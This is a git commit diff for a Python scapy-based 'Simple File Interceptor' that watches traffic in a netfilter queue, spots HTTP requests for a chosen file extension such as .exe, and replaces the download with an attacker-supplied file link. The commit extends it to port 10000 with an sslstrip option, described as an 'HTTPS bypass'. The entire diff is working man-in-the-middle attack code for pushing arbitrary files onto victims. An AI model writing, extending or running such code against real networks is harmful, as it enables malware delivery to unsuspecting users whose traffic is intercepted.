f2c55c2aee120686fe871187f8e9f55bfc93a923
Daniil Nababkin <43863412+TheRavehorn@users.noreply.github.com>
2020-08-24 17:49:10 -0400

    Update main.py
    [+] HTTPS bypass added.

--- main.py
+++ main.py
@@ -7,12 +7,12 @@ ack_list = []
 
 def process_packet(pkt):
     scapy_pkt = scapy.IP(pkt.get_payload())
-    if scapy_pkt.haslayer(scapy.Raw):
-        if scapy_pkt[scapy.TCP].dport == 80:
-            if extension in str(scapy_pkt[scapy.Raw].load):
-                print("[+] .exe request")
+    if scapy_pkt.haslayer(scapy.Raw) and scapy_pkt.haslayer(scapy.TCP):
+        if scapy_pkt[scapy.TCP].dport == 80 or scapy_pkt[scapy.TCP].dport == 10000:
+            if extension in str(scapy_pkt[scapy.Raw].load) and replace_link not in str(scapy_pkt[scapy.Raw].load):
+                print("[+] {} request".format(extension))
                 ack_list.append(scapy_pkt[scapy.TCP].ack)
-        elif scapy_pkt[scapy.TCP].sport == 80:
+        elif scapy_pkt[scapy.TCP].sport == 80 or scapy_pkt[scapy.TCP].sport == 10000:
             if scapy_pkt[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_pkt[scapy.TCP].seq)
                 print("[+] Replacing file")
@@ -27,6 +27,7 @@ def process_packet(pkt):
 
 
 print("Simple File Interceptor 0.01 by Ravehorn")
+destination = input("Destination (sslstrip, forward, local) -> ")
 extension = input("What extension do you want to target? (.exe, etc) -> ")
 replace_link = input("What file do you want to toss in? (link) -> ")
-queue = SNFQ(process_packet)
+queue = SNFQ(process_packet, destination=destination)
